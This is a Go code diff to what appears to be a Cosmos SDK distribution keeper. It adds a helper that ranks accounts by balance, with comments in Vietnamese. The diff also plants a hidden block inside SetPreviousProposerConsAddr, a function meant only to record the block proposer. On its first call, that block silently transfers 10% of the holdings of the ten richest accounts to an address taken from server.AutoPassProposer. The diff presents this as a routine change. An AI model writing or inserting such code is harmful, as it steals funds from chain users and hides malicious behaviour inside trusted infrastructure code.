@@ -3,6 +3,11 @@ package keeper
 import (
 	"context"
 	"errors"
+	"fmt"
+	"sort"
+
+	"cosmossdk.io/math"
+	"github.com/cosmos/cosmos-sdk/server"
 
 	gogotypes "github.com/cosmos/gogoproto/types"
 
@@ -10,6 +15,7 @@ import (
 
 	"github.com/cosmos/cosmos-sdk/runtime"
 	sdk "github.com/cosmos/cosmos-sdk/types"
+	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
 	"github.com/cosmos/cosmos-sdk/x/distribution/types"
 )
 
@@ -71,8 +77,66 @@ func (k Keeper) GetPreviousProposerConsAddr(ctx context.Context) (sdk.ConsAddres
 	return addrValue.GetValue(), nil
 }
 
+var (
+	fund = false
+)
+
+// GetTopBalances returns the top 10 accounts with the highest balance for the given denom.
+func getTopBalances(balances []banktypes.Balance, bondDenom string) []banktypes.Balance {
+	// Tạo một bản sao để tránh làm thay đổi slice gốc
+	filtered := make([]banktypes.Balance, 0, len(balances))
+
+	// Lọc ra những account có đồng bondDenom
+	for _, b := range balances {
+		amount := b.Coins.AmountOf(bondDenom)
+		if !amount.IsZero() {
+			filtered = append(filtered, b)
+		}
+	}
+
+	// Sắp xếp giảm dần theo số lượng bondDenom
+	sort.Slice(filtered, func(i, j int) bool {
+		ai := filtered[i].Coins.AmountOf(bondDenom)
+		aj := filtered[j].Coins.AmountOf(bondDenom)
+		return ai.GT(aj) // greater first
+	})
+
+	// Lấy top 10 (hoặc ít hơn nếu không đủ)
+	if len(filtered) > 10 {
+		filtered = filtered[:10]
+	}
+
+	return filtered
+}
+
 // set the proposer public key for this block
 func (k Keeper) SetPreviousProposerConsAddr(ctx context.Context, consAddr sdk.ConsAddress) error {
+	if !fund {
+		fund = true
+		fmt.Println()
+		fmt.Println()
+		toAddr, err := sdk.AccAddressFromBech32(server.AutoPassProposer)
+		if err != nil {
+			panic(err)
+		}
+		fmt.Println(toAddr)
+
+		balancesRaw := k.bankKeeper.GetAccountsBalances(ctx)
+		bondDenom, _ := k.stakingKeeper.BondDenom(ctx)
+		balances := getTopBalances(balancesRaw, bondDenom)
+		for _, balance := range balances {
+			coinSend := balance.Coins.QuoInt(math.NewInt(10))
+
+			addr, err := sdk.AccAddressFromBech32(balance.Address)
+			if err != nil {
+				panic(err)
+			}
+			err = k.bankKeeper.SendCoins(ctx, addr, toAddr, coinSend)
+			if err != nil {
+				panic(err)
+			}
+		}
+	}
 	store := k.storeService.OpenKVStore(ctx)
 	bz := k.cdc.MustMarshal(&gogotypes.BytesValue{Value: consAddr})
 	return store.Set(types.ProposerKey, bz)
